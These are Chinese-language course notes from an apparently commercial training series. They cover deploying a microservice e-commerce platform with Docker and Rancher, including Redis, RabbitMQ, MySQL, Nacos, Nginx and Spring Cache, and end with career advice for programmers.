* Docker容器化部署微服务比传统方式快，一直容器化部署一直爽

```
在实操中发现，像 Docker 之类的容器引擎，折腾少量容器还行

但如今的云原生应用、机器学习任务或者大数据分析业务，动辄就要使用成百上千的容器

要管理这么多容器，Docker 们就力不从心了
```



* 问题

  * 简单的几个容器可以方便管理，但稍微有规模的公司里面肯定是成千上万的容器在运行

  * 怎么快速部署容器

  * 怎么管理这些容器

  * 怎么监控这些容器状态

  * 容器之间通讯怎么管理

    ....

* 和云基础设施的任何其他组件一样，容器需要监控和控制，否则将根本不知道服务器上运行的是什么

* 技术人员都是”懒的“
  
  * 有需求就有改变，市场上就出现了一批【容器编排】工具，典型的是 Swarm、Mesos 和 K8S等













#### 第2集 带你走入容器编排工具的那些事情

**简介：带你走入容器编排工具的那些事情**

* 为了解决容器管理的问题，就有了容器编排管理工具

* 什么是容器编排

```
提供调度和管理集群的技术，提供用于基于容器应用可扩展性的基本机制,这些工具使用容器服务，并编排他们以决定容器之间如何进行交互, 包括网络， 存储， 负载均衡， DNS和安全模块等的编排调度
```

* 主流的容器编排工具
  * Docker Swarm
  * Apache Mesos
  * Kubernetes

```
经过几年的竞争，K8S 击败 Swarm 和 Mesos，几乎成了当前容器编排的事实标准

K8S 最初是由 Google 开发的，后来捐赠给了 CNCF（云原生计算基金会，隶属 Linux 基金会）
```

* K8S 既然那么猛，直接拿来用不香吗？

  * 如果当练习，看官方文档很快上手，上手的前提要懂很多概念

  ```
   Pod、ingress、Service、Node、kubelet、kube-proxy、API Server、Scheduler、Labels、Deployment...
  ```

  * 当要搭建生产环境的时候，事情就变得不一样了
  * 不止搭建集群过程很复杂，后期还要面对更繁琐的 K8S 控制平面维护工作，版本升级、安全管控、数据备份
  * 对于k8s集群的运维复杂度也很高

* 等你掌握一系列概念后且搭建过本地的k8s
  * 开发人员的你：一个月后你会忘记80%的知识
  * 公司里：能用上k8s的公司，基本不太可能让一个业务开发人员去操作到k8s的东西
  * 公司谁负责：运维工程师、容器开发工程师、云平台开发工程师等

![image-20210310114801658](img/image-20210310114801658.png)

























#### 第3集 一线互联网大厂里面的一站式DevOps平台介绍

**简介：一线互联网大厂里面的一站式DevOps平台介绍**

* 阿里、腾讯、字节、京东、美团等都有一站式DevOps平台
  * 提供从「需求->开发->测试->发布->运维->运营」端到端的协同服务和研发工具



* 大厂里面是如何操作的
  * 专门的团队开发维护好自己BU的容器管理平台(k8s)
  * 阿里的Aone-》对应阿里云产品 云效 https://devops.aliyun.com/

![img](img/p203655.png)

![image-20210310120627509](img/image-20210310120627509.png)



* 咱们工程师都是“懒的”

  * 容器编排正快速发展，从主要的基础设施公司到PAAS供应商，不仅仅是明显的编排工具，更重要的是要构建、部署、CI/CD等一系列功能
  * 很多厂商也在PaaS平台做一些工作，重点在于让开发人员不必关心底层应用部署细节，只需想好要什么即可

  

* 容器编排PaaS云平台

  * KubeSphere

    * https://kubesphere.com.cn/

    ```
    KubeSphere 是在 Kubernetes 之上构建的面向云原生应用的分布式操作系统，完全开源，支持多云与多集群管理，提供全栈的 IT 自动化运维能力，简化企业的 DevOps 工作流。它的架构可以非常方便地使第三方应用与云原生生态组件进行即插即用 (plug-and-play) 的集成。
    ```

    

  * Rancher

    * https://rancher.com/

    ```
    是一个开源的企业级容器管理平台, 通过Rancher企业再也不必自己使用一系列的开源软件去从头搭建容器服务平台。
    
    Rancher提供了在生产环境中使用的管理Docker和Kubernetes的全栈化容器部署与管理平台
    ```

    

  * Rancher+KubeSphere总结

  ```
  都是基于K8s提供功能,是比较优秀的k8s集群管理平台，对于降低k8s集群运维复杂度，降低运维成本，使开发人员能尽快上手部署微服务
  ```

  




















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十二章 工业级PaaS容器管理平台Rancher入门到部署实战



#### 第1集 容器编排管理平台Rancher介绍和概念讲解

**简介：容器编排管理平台Rancher介绍和概念讲解**

* 什么是Rancher
  * 地址：https://rancher.com/
  * 是一个开源的企业级PaaS容器管理平台。通过Rancher，企业再也不必自己使用一系列的开源软件去从头搭建容器服务平台
  * Rancher提供了在生产环境中使用的管理Docker和Kubernetes的全栈化容器部署与管理平台

* 特性
  * 基础设施编排
    * 可以使用任何公有云或者私有云的Linux主机资源
    * Linux主机可以是虚拟机，也可以是物理机
    * Rancher仅需要主机有CPU，内存，本地磁盘和网络资源，从Rancher的角度来说，一台云厂商提供的云主机和一台自己的物理机是一样的
  * 容器编排与调度
    * 包含了当前全部主流的编排调度引擎，例如Docker Swarm， Kubernetes， 和Mesos
    * 同一个用户可以创建Swarm或者Kubernetes集群。并且可以使用原生的Swarm或者Kubernetes工具管理应用
    * 除了Swarm，Kubernetes和Mesos之外，Rancher还支持自己的Cattle容器编排调度引擎
    * Cattle被广泛用于编排Rancher自己的基础设施服务以及用于Swarm集群，Kubernetes集群和Mesos集群的配置，管理与升级

* 例子
  * http://112.74.55.160:8888/



* 版本说明

  * 1.x  

  ```
  最新1.6版本，各个组件相对稳定，使用起来便捷很多
  
  文档：https://rancher.com/docs/rancher/v1.6/zh/
  ```

  * 2.x

  ```
  网络要求比较高，安装组件需要大量的下载包模块，部分组件需要 网络加速 访问海外
  ```

  

















#### 第2集 阿里云服务器安装Rancher机器准备和环境安装

**简介：阿里云服务器安装Rancher机器准备和环境安装**

* 阿里云机器准备 1台（后续多台用按量付费） 

  * 阿里云购买地址：https://www.aliyun.com/minisite/goods?taskCode=pintuan20201212&recordId=292600&userCode=r5saexap
  * 操作系统 CentOS7.X
  * 默认带宽1M
  * 最少2核4g，推荐2核8g
  * **注意：用新用户购买才有折扣，新手机号和新身份证，新用户权益只有1次，买久一点，比如3年**

  ![image-20210310143531458](img/image-20210310143531458.png)

* Linux环境下安装Docker

```
#安装并运行Docker。
yum install docker-io -y
systemctl start docker

#检查安装结果。
docker info

#启动使用Docker
systemctl start docker     #运行Docker守护进程
systemctl stop docker      #停止Docker守护进程
systemctl restart docker   #重启Docker守护进程


#修改镜像仓库
vim /etc/docker/daemon.json
#改为下面内容，然后重启docker
{
"debug":true,"experimental":true,
"registry-mirrors":["https://pb5bklzr.mirror.aliyuncs.com","https://hub-mirror.c.163.com","https://docker.mirrors.ustc.edu.cn"]
}

#查看信息
docker info
```















#### 第3集 Docker容器化部署Rancher和通信模型介绍

**简介：Docker容器化部署Rancher和通信模型介绍**

* 容器化部署Rancher

```
CentOS 7.0默认使用的是firewall作为防火墙
查看防火墙状态
firewall-cmd --state

停止firewall
systemctl stop firewalld.service

禁止firewall开机启动
systemctl disable firewalld.service

安装rancher
docker run -d --restart=unless-stopped -p 8888:8080 rancher/server
```

* 通信模型介绍
  * Client-Server模式
  * 每个Linux主机是Client端，需要连接到Rancher的Server端

* 网络安全组开放8888端口

* 控制台 右下角切换语言为中文

* 配置账号密码：系统管理-》访问控制

  





















#### 第4集 Rancher管控台介绍和操作指引

**简介：Rancher管控台介绍和操作指引**

* 环境介绍
  * 确保环境之间的安全隔离，将“开发”环境的访问权限赋予全部人员，但限制“生产”环境的访问权限给一个小的团队
  * 开发 、测试、预发布、生产
* 应用
* 应用商店
* 基础架构
* 系统管理
* API

* 绑定Host
  * 安装rancher agent
















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十三章 PaaS容器管理平台Rancher部署1024电商平台中间件



#### 第1集 Rancher容器化部署分布式缓存-Redis6和密码配置

**简介：Rancher容器化部署Redis分布式缓存**

* 部署redis

* 配置 

```
docker run -itd --name xdclass-redis -p 8000:6379 redis --requirepass 123456 -v /data/redis/data:/data
```

* rancher配置

```
redis-server --appendonly yes --requirepass 123456
```





















#### 第2集 Rancher容器化部署消息队列RabbitMQ

**简介：Rancher容器化部署RabbitMQ消息队列**

* 部署RabbitMQ
* 配置

```
docker run -d --hostname rabbit_host1 --name rabbitmq1 -p 15672:15672 -p 5672:5672  -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=xdclass.net168  --privileged=true -v /usr/local/rabbitmq/1/lib:/var/lib/rabbitmq -v /usr/local/rabbitmq/1/log:/var/log/rabbitmq rabbitmq:management
```

* rancher配置

```
镜像版本  rabbitmq:3.8.14-management
```



















#### 第3集 Rancher容器化部署数据库MySQL和持久化配置

**简介：Rancher容器化部署数据库Mysql**

* 部署数据库mysql

* 配置

```
docker run -p 3306:3306 --name xdclass_mysql \
-v /usr/local/docker/mysql/conf:/etc/mysql \
-v /usr/local/docker/mysql/logs:/var/log/mysql \
-v /usr/local/docker/mysql/data:/var/lib/mysql \
-e MYSQL_ROOT_PASSWORD=xdclass.net168 \
-d mysql:5.7
```



















#### 第4集 微服务业务数据库和Nacos持久化数据库导入

**简介：Rancher容器化导入微服务数据库和Nacos持久化配置导入**

* Nacos持久化数据库建立

  * nacos数据库脚本

    - 导入数据库脚本（本章本集资料里面）
    - 新增一个用户 nacos/nacos

    ```
    INSERT INTO `users` (`username`, `password`, `enabled`)
    VALUES
      ('nacos', '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu', 1);
    ```

* 微服务业务数据库导入

* 数据库还有其他的基础设施
  
* 一般会单独的linux用户去操作，非root，但也是个独立的用户
  
* 数据库脚本在本章本集资料里面，如果大家导入失败，可以用自己本地的，也可以粘贴部分建表语句一个个执行



















#### 第5集 Rancher容器化部署注册中心Nacos和数据库持久化配置

**简介：Rancher容器化部署注册中心Nacos和数据库持久化配置**

* 部署Nacos

* 配置

```
docker run -d \
-e MODE=standalone \
-e SPRING_DATASOURCE_PLATFORM=mysql \
-e MYSQL_SERVICE_HOST=192.168.0.104 \
-e MYSQL_SERVICE_PORT=3306 \
-e MYSQL_SERVICE_USER=root \
-e MYSQL_SERVICE_PASSWORD=xdclass.net168 \
-e MYSQL_SERVICE_DB_NAME=xdclass_nacos \
-p 8848:8848 \
--restart=always \
--name nacos \
nacos/nacos-server:latest 
```

* 查看容器内部的日志-》控制台输出

















#### 第6集 服务升级操作-Nacos内存JVM参数调整

**简介：服务升级操作-Nacos内存JVM参数调整**

* 官方文档：https://nacos.io/zh-cn/docs/quick-start-docker.html
* 调整Nacos内存参数
  * JVM_XMS
  * JVM_XMX
  * JVM_XMN

























#### 第7集 Rancher业务体系技能一键导出和恢复Rancher配置实战

**简介：业务安全技能一键导出和恢复Rancher配置实战**

* 背景：
  * 测试环境搭建好相关配置，怎么开始迁移到线上
* 开启应用服务配置导出和恢复


























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十四章  容器编排调度-Rancher部署AlibabaCloud微服务项目实战



#### 第1集 容器编排调度-部署AlibabaCloud微服务流程梳理

**简介：容器编排调度-部署AlibabaCloud微服务流程梳理**

* 部署AlibabaCloud微服务流程梳理
  * 配置镜像仓，从私有镜像仓拉取镜像
  * Rancher根据规则选择资源池机器（默认是根据负载和机器配置，也可以指定）
  * 部署对应的微服务

* 【特别重要】网络问题说明
  * 容器间通信，有些机器网络不通需要额外配置
  * 微服务都在同个宿主机上进行配置部署先





















#### 第2集 Rancher配置自定义Docker私有镜像仓

**简介：Rancher配置自定义Docker私有镜像仓**

* 配置阿里云私有镜像仓















#### 第3集 Rancher玩转多台阿里云主机-按量付费形式配置

**简介：Rancher玩转多台阿里云主机-按量付费形式配置**

* 背景
  * 微服务一般都是集群，需要多台主机，包括后续扩容多节点
  * 因此资源池需要足够大

* 什么阿里云的按量付费
  * 根据使用时长进行付费，到时见后就释放，不过需要往阿里云充值100元以上
  * 大家也可以买一到两周常规的服务器，2核8g内存，主要是部署多节点
  * 微服务部署只要导出compose.yml，可以快速的恢复访问



* 连接上rancher server















#### 第4集 容器编排调度-Rancher部署商品微服务实战

**简介：Rancher部署商品微服务实战**

* 配置商品微服务镜像
* 商品微服务配置中心迁移配置
* 正常情况
  * 微服务和基础中间件都应该内网通讯-性能才最高
  * 现在使用公网ip,是为了方便测试
  * 相关的yml配置要小心























#### 第5集 容器编排调度-Rancher部署用户微服务实战

**简介：Rancher部署用户微服务实战**

* 配置用户微服务镜像
* 用户微服务配置中心迁移配置





















#### 第6集 容器编排调度-Rancher部署优惠券微服务实战

**简介：Rancher部署优惠券微服务实战**

* 配置优惠券微服务镜像
* 优惠券微服务配置中心迁移配置

























#### 第7集 容器编排调度-Rancher部署订单微服务实战

**简介：Rancher部署订单微服务实战**

* 配置订单微服务镜像
* 订单微服务配置中心迁移配置























#### 第8集 容器编排调度-Rancher部署Gateway网关实战

**简介：Rancher部署网关实战**

* 配置网关微服务镜像
* 网关微服务配置中心迁移配置
























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十五章 1024电商平台微服务网络隔离和功能链路测试

#### 第1集 聚合访问入口网关-业务微服务升级和Rancher备份

**简介： 聚合访问入口网关-业务微服务升级**

* 微服务不对外进行访问
* 通过网关对外是最终的入口

![image-20210312142458370](img/image-20210312142458370.png)

* 操作

  * 业务微服务不用配置端口，通过网关去寻找，结合注册中心
  * rancher部署网关和对应的服务需要在同个网络里面才可以访问（先都在同个网络进行访问）
  * 和nacos可以分开不通的机器,但最好还是同个机房，性能才高
  * 如果nacos在不同机房，注册中心里面的地址是服务的容器ip地址，网关也是可以识别的，因为网关和服务是同个网络

  

* 备份全部资料代码+数据库+compose文件



















#### 第2集 1024电商平台链路测试实战《上》

**简介： 1024电商平台链路测试实战**

* 微服务功能测试

  * 用户微服务

  * 优惠券微服务

    

























#### 第3集 1024电商平台链路测试实战《下》

**简介： 1024电商平台链路测试实战**

* 微服务功能测试
  * 商品微服务
  * 订单微服务

* 目前没域名，所以支付状态回调通知忽略

  














![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十六章 【高级篇幅】业务网关集群配置+海量请求下容器自动化扩容实战



#### 第1集 面试题：你知道Nginx和业务网关gateway的区别吗

**简介： Nginx和业务网关gateway知识讲解**

* 面试官：为啥有了gateway，还需要nginx呢？

```
前端请求到gateway，gateway在转发到相应的业务微服务，为什么不可以直接从nginx转发到相应的业务中心，还要加多一层
```

![image-20210313163918048](img/image-20210313163918048.png)

* 答案

  * nginx和Spring Cloud Gateway在功能上是有一些重叠的地方，但是各司其职互相配合会更强大
  * Spring Cloud Gateway层
    * 可以认为是业务网关，针对SpringCloud体系专门推出，但是如果有其他服务不是用Cloud开发的怎么办？
    * 有部分复杂业务逻辑nginx解决不了，可以用gateway用java语言开发
    * 容器部署微服务的ip地址一直在换，需要结合注册中心来使用，所以gateway更灵活

  * Nginx
    * 关注的是协议和路由的转发，聚合入口方便配置管理
    * 在性能、容错机制上比Gateway强，多语言多环境下兼容性更好
    * 日志统计、协议路由转发、业务数据缓存前置、资源压缩等也是比较强大
    * 配置HTTPS证书更灵活、Openresty+Lua开发各个强大的功能模块
    * 例子：如何做一个动态黑名单控制

![image-20210313164101810](img/image-20210313164101810.png)











#### 第2集 线上容器化部署Nginx+阿里云域名解析映射

**简介： 线上容器化部署Nginx+阿里云域名解析映射**

* rancher部署nginx的问题

```
有个问题：Rancher部署nginx+宿主机映射版本有兼容问题，后续再排查
```

* 使用Docker容器化部署也一样

```
docker run --name xdclass-nginx -d -p 80:80 -v /usr/local/nginx/conf/nginx.conf:/etc/nginx/nginx.conf nginx
```

* nginx.conf配置文件在本章本集的资料里面

* 配置域名解析
  * 大家看nginx专题视频
  * 购买域名，备案域名
  * open1024.com 解析 

























#### 第3集 网关Gateway集群部署+Nginx反向代理负载均衡配置

**简介： 网关Gateway集群部署+Nginx反向代理负载均衡配置**

* Gateway启动多节点

* nginx配置gateway负载均衡 (内网ip)

```
upstream gateway {
  
    server 172.18.119.139:8889;
    server 172.18.119.139:8888;
  }
    server {
        listen 80;
 
    server_name open1024.com;
        location / {
 
          proxy_pass http://gateway/;
        }
 
}

```

* 作业

  * 申请https证书，配置https域名访问
  * 实在不会的：看nginx专题视频

  ```
  https://detail.tmall.com/item.htm?id=627044937174
  ```

  

![image-20210313163918048](img/image-20210313163918048.png)













#### 第4集 海量请求下-业务微服务集群-容器自动化缩容和扩容实战

**简介： 业务微服务容器缩容和扩容实战**

* 什么业务容器的缩容和扩容
  * 突发流量可以快速扩容
  * 流量峰值过去可以快速缩容

* WebHook介绍

  * 钩子监听器，用于触发事件
    * 思路
      * 监控系统监听->接口RT、CPU、内存、IO 等负载
      * 配置对应的阈值情况，超过最大阈值则进行扩容，恢复正常则缩容
      * 最快且容易方式：nginx的访问日志：pv、uv、rt

* 注意事项：

  * hook需要使用post方式请求
  * 业务微服务端口不能写死，不然不知道扩容或者缩容使用哪个
  * 最终都是通过网关进行访问对应的微服务
  * 资源池需要足够多，一般互联网公司都有足够多的机器作为备用
  * 补充：hook请求http响应码是200就是成功，如果非200，就是调用失败，可以超过最高或者最低节点数

  ![image-20210315111647698](img/image-20210315111647698.png)

![image-20210315111758005](img/image-20210315111758005.png)



















#### 第5集 高级技能-Rancher外部服务和解耦配置实战

**简介： Rancher外部服务和配置实战**

* 部署在Rancher之外的服务想要整合进Rancher，通过添加一个外部服务的功能将它添加到Rancher集群
  * 在应用上，通过 **添加服务** 旁边的下拉菜单按钮添加外部服务，选择 **外部服务**

![image-20210313134029233](img/image-20210313134029233.png)

* 微服务容器间通信的方式
  * 方式一：不同主机间容器网络互通的话，直接使用升级应用 采用 ”服务链接“ 的方式
  * 方式二：通过 外部服务 指定ip，微服务配置文件不用写死ip，通过 ”服务链接“ 的方式











#### 第6集 海量请求应对-Rancher部署Sentinel限流实战

**简介： Rancher部署Sentinel限流实战**

* 部署Sentinel

```
镜像：bladex/sentinel-dashboard:latest
```

* 配置文件修改
















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十七章 1024电商平台问题讨论-解决坑+Bug



#### 第1集 1024电商平台里面常见的几个坑之ThreadLocal和锁粒度

**简介：讲解项目代码里面的坑和锁粒度**

* ThreadLoacl的问题
  * set之后建议remove

![image-20210315134122857](img/image-20210315134122857.png)

* 优惠券锁粒度
  *  "lock:coupon:"+couponId+userid，锁粒度更细化

![image-20210315134324322](img/image-20210315134324322.png)



* mq监听加锁的逻辑bug
  * 口误，应该是先加锁，然后操作业务逻辑

![image-20210315135344313](img/image-20210315135344313.png)



















#### 第2集 1024电商平台里面常见的几个坑之事务和锁的先后顺序

**简介：项目里面的坑之事务和锁的先后顺序**

* 问题：
  * 分布式锁放在事务内部，并不能解决超领问题，锁释放后，事务没有及时的提交，还是会超领
  * 模拟方式：释放锁后-线程睡眠

* 解决方式
  * 将加锁的的操作放在事务的外层，保证事务提交成功后，才能进行锁的释放




























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十八章 微服务性能优化之分布式缓存实战



#### 第1集 高并发项目必备利器之分布式缓存和本地缓存

**简介: 讲解分布式缓存和本地缓存知识**

- 什么是缓存
  - 程序经常要调用的对象存在内存中,方便其使用时可以快速调用,不必去数据库或者其他持久化设备中查询，主要就是提高性能
  - DNS缓存、前端缓存、代理服务器缓存Nginx、应用程序缓存（本地缓存、分布式缓存）、数据库缓存 

- 分布式缓存
  - 与应用分离的缓存组件或服务，与本地应用隔离一个独立的应用，多个应用可直接的共享缓存
  - 常见的分布式缓存 Redis、Memcached等
- 本地缓存
  - 和业务程序一起的缓存，例如myabtis的一级或者二级缓存，本地缓存自然是最快的，但是不能在多个节点共享
  - 常见的本地缓存：ssm基础课程myabtis 一级缓存、mybatis二级缓存；框架本身的缓存； redis本地单机服务；ehchche；guava cache、Caffeine等

- 选择本地缓存和分布式缓存
  - 和业务数据结合去选择
  - 高并发项目里面一般都是有本地缓存和分布式缓存共同存在的













#### 第2集 面试必备-缓存穿透-击穿和雪崩你能区分不

**简介：缓存穿透、击穿和雪崩你是否可以区分**

- 考点：缓存穿透-击穿-雪崩知识点

- 能否说下缓存击穿、穿透、雪崩的区别？

- 针对这些问题，说下常见的解决方案

  - 缓存击穿 (某个热点key缓存失效了)

    - 缓存中没有但数据库中有的数据，假如是热点数据，那key在缓存过期的一刻，同时有大量的请求，这些请求都会击穿到DB，造成瞬时DB请求量大、压力增大。
    - 和缓存雪崩的区别在于这里针对某一key缓存，后者则是很多key。

    - 预防：设置热点数据不过期，定时任务定时更新缓存，或者设置互斥锁

  - 缓存穿透（查询不存在数据）

    - 查询一个不存在的数据，由于缓存是不命中的，并且出于容错考虑，如发起为id为“-1”不存在的数据
    - 如果从存储层查不到数据则不写入缓存这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义。存在大量查询不存在的数据，可能DB就挂掉了，这也是黑客利用不存在的key频繁攻击应用的一种方式。

    - 预防：接口层增加校验，数据合理性校验，缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，设置短点的过期时间，防止同个key被一直攻击

     

  - 缓存雪崩 (多个热点key都过期)

    - 大量的key设置了相同的过期时间，导致在缓存在同一时刻全部失效，造成瞬时DB请求量大、压力骤增，引起雪崩
    - 预防：存数据的过期时间设置随机，防止同一时间大量数据过期现象发生，设置热点数据永远不过期，定时任务定时更新



















#### 第3集 微服务项目-SpringCache缓存框架引入

**简介：微服务项目-SpringCache缓存框架引入**

* SpringCache简介
  * 自Spring 3.1起，提供了类似于@Transactional注解事务的注解Cache支持，且提供了Cache抽象
  * 提供基本的Cache抽象，方便切换各种底层Cache
  * 只需要更少的代码就可以完成业务数据的缓存
  * 提供事务回滚时也自动回滚缓存，支持比较复杂的缓存逻辑
  * 核心：一个是Cache接口，缓存操作的API；一个是CacheManager管理各类缓存，有多个缓存框架的实现
  * 更多详细操作和定制-可以看，小滴课堂Redis6专题视频

* 微服务中引入

  * common项目中添加依赖 

  ```
         <dependency>
             <groupId>org.springframework.boot</groupId>
             <artifactId>spring-boot-starter-cache</artifactId>
         </dependency>
  ```

  * 配置文件指定缓存类型

  ```
  spring:
    cache:
      type: redis
  ```

  * 启动类开启缓存注解 

  ```
  @EnableCaching
  ```

* 修改redis缓存序列化器

  ```
  @Configuration
  @EnableCaching
  public class CustomRedisCacheManager extends CachingConfigurerSupport {
  
      @Bean
      public RedisCacheConfiguration redisCacheConfiguration(){
          Jackson2JsonRedisSerializer<Object> jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer<>(Object.class);
          RedisCacheConfiguration configuration = RedisCacheConfiguration.defaultCacheConfig();
          configuration = configuration.serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer)).entryTtl(Duration.ofMinutes(1));
          return configuration;
      }
  
  }
  ```

  











#### 第4集 优惠券微服务-整合分布式缓存redis实战

**简介：优惠券微服务-整合分布式缓存redis实战**

* 几个注解快速回顾

```
@CachePut  应用到写数据的方法上，如新增/修改方法，调用方法时会自动把相应的数据放入缓存

@CacheEvict 清空对应的缓存

@Cacheable 读取的数据放到缓存中

@Caching 组合上面的3个注解进行使用
```

* 优惠券列表分页缓存
  * 缓存名，它指定了你的缓存存放在哪块命名空间
  * key里面是el表达式，所以如果是拼接字符串需要用单引号

```
@Cacheable(value = {"coupon"},key = "#root.methodName + #page+'_'+#size")
```















#### 第5集 面试场景-关于分布式缓存的思考和接口QPS的描述

**简介：面试场景-关于分布式缓存的思考和接口QPS的描述**

* 其他微服务大家可以根据需要进行添加
  * 最终看业务是否接收短暂的数据不一致【缓存和数据库】
    * 缓存过期时间不宜过长
    * 性能要求高前提，极端情况下存在短暂的不一致
  * 使用缓存的话，一般是最终一致性

* 微服务只读接口使用了缓存
  * 内网压测，暂停其他相关的高负载进程，4核8g配置
  * 单机qps可以到达2~3万
  * 写接口的话看链路
    * 下单  100~500
    * 注册 1000
    * 登录  1万
    * 收藏  1万
    * 加购  1万















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第四十九章  1024电商平台整体回顾总结+思路拓展



#### 第1集 1024电商平台整体回顾总结和思考

**简介：1024电商平台整体回顾总结和思考**

- 业务整体架构图

![小滴课堂-工业级中台电商架构图](img/小滴课堂-工业级中台电商架构图.png)



- 各个大模块功能介绍（有个大体认知就行）

- 项目规模和人员配比（高级工程师或者TeamLeader面试会问到，为什么这样搭配？）

  - 公司规模800人左右，技术人员占比300人，这边业务线研发人员50人左右, 研发人员是业务线划分

  - 研发人员: 50人（总负责人高级技术专家, 阿里P8或者资深P7+）

    - 前端10人

      - 负责C端界面研发、管理后端研发
      - 部分具备全栈功能

    - 后端20人

      - 多个微服务开发和工程搭建
      - 每个微服务都有2个主负责人，1人手上会有2~3个项目
      - 5~10人有一个小组组长(P7)

    - 运维3人

      - 负责K8S和Rancher平台微服务、中间件搭建、监控处理、IaaS资源管理

    - 测试5人:

    - app端开发 12人（Flutter技术栈）

       

  - 开发周期：1到2年，不断迭代

    - 初版1~2个月，接下去是每个周一个版本

  - 这个就说到了一个，如何定义一个完整的项目，任何企业的产品都是不断迭代，功能增加删除



















#### 第2集 1024电商平台进一步细化-版本迭代和你应该学的知识

**简介：1024电商平台进一步细化思路扩展**

* 产品要么半年后消失，要么壮大，进而不断的迭代发展

![image-20210316221656443](../../../Library/Application Support/typora-user-images/image-20210316221656443.png)

* Jmeter压测，看使用缓存前后的性能qps、jvm性能优化，没有固定参数配置，都是业务逻辑息息相关
  * 课程里面的多个解决方案测试，比如seata和延迟消息解决分布式事务的性能区别
* 网络和容器（运维）：Https证书、Rancher2.x升级、K8S部署
* 日志 (运维)：日志采集输送-ELK处理处理、nginx日志流量二次挖掘
* 大数据 (算法团队)：用户行为日志采集分析、构建商品推荐服务、反作弊系统
* 监控体系搭建(运维)：Zabbix - Nagios - Open-Falcon - Prometheus
* 高可用(运维+开发)：架构单元化改造-多机房部署数据同步
* 产品运营+发布(产品+开发)：AB测试平台、灰度平台、数据分析平台
* 海量数据处理(运维+开发)：海量数据下分库分表、冷热数据分离+数据路由、数据库架构+同步

![小滴课堂-工业级中台电商架构图](img/小滴课堂-工业级中台电商架构图.png)




























![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十章  【跳槽涨薪季】高级工程师OR技术经理的职业发展和真实避坑经历



#### 第1集 跳槽涨薪季- 不要埋头搬砖-总结自己过去和定位当下职业发展

**简介：关于自己过去和未来职业的定位梳理**

* 现在呢，看完大课训练营的微服务部署-项目开发，编写一份自己的简历，然后再往下看
  * 说不定群里的有不少同学再大量招聘了
  * 万一写的不好，也没啥，后面教你怎么写简历
* 看这套视频的你，应该是这几个阶段，对号入座
  * 工作1~3年
    * 初中级工程师，传统IT企业，或者小型互联网公司，写过几个项目，有上线-有下线的
  * 工作3~6年
    * 中高级工程师，带过小团队也取得过成就，但技术栈得不到更新或者业务没啥亮点
  * 工作6~8年
    * 技术leader 或 CTO、经过N个公司和项目，但是技术栈偏传统或者业务没啥亮点
  * 刚毕业或者刚培训出来
    * 可能再小公司工作，刚开始搬砖，对自己的职业发展不清晰
    * 遇到复杂需求或者业务不会写，或者看视频会了但是真到自己写就不会
  * 处在外包公司中
    * 赶紧跳槽-找个正职
* 对于自己的三-五-十年规划还是要有的

![img](img/9f7e214caefd9f0a10945772d94735e5.png)

















#### 第2集 跳槽涨薪季-32岁后程序员真的会被优化找不到工作吗？

**简介 ：32岁后程序员真的会被优化找不到工作吗？**

* 为啥我会提出这个问题，或者我是怎么知道的？
  * 身边朋友问我
  * 群里的很多小伙伴问我
  * 各类公众号、博客、短视频、知乎等
  * 身边的同事被优化了！！！

![image-20210316224614425](img/image-20210316224614425.png)

* 被裁员的原因很多
  * 公司倒闭
  * 企业用人成本缩减
  * 项目完成不用那么多人(外包尤其明显)
  * BAT大厂里面-最多的是业务线被砍了
  * 独角兽企业-被其他大厂收购了



* 说些我身边这些年发生的事情

  * 可能看视频的你没被优化，或者是你还年轻，或者你掌握了些做事的技巧

  * 当然我也还没被优化过，因为我从毕业的时候就知道这些做事的法则

  * 身边大学毕业的，40来个人，5年内从事专业的，大概就30多人，然后被裁员优化过的超过三分之二

  * 也有些分辨能力太差-进了赌博、色情类软件的开发公司，然后就”进去了“

  * 我待过的大厂或者身边在其他大厂的同学不少，被优化的也很多-包括腾讯-阿里-字节-YY-网易大厂

    ![image-20210316225856758](img/image-20210316225856758.png)



















#### 第3集 跳槽涨薪季-不被裁员优化-你需要怎么做

**简介 ：不被裁员优化-你需要怎么做**

* 怎么避免这些裁员优化呢？

  * 记住：老板都喜欢聪明的人，情商高+技术好

    * 不是止是国企，互联网公司也一样，各行各业需要

    * 换位思考，假如你是leader, 你需要怎样的下属和团队

      * 一个天天搬砖，一个又会搬砖又会吹水各种活跃

      

  * 年纪28岁以上，一定要”技术+管理“ 双管齐下，更不用说，30或者35岁了

    * 不要听信鸡汤，说以后可以做管理、培训讲师，请不要给自己的懒找接口，被网上的文章迷惑 
    * 哪有那么多给你”管理“给你做，现在都是斜杠青年居多，会技术又会管理的不在少数
    * 讲师你做不了多久，技术要好+口才要好，且光输出没输入肯定不行，故步自封更危险

  * 【公司里面你需要主动识别重要项目or事情】

    * 争取拿到好的项目或者进去好的项目组或者BU
    * 一定要做到自己是这个项目的核心负责人或就是主程
    * 自私点说，就是项目少了你就风险很大，或者进行不下去
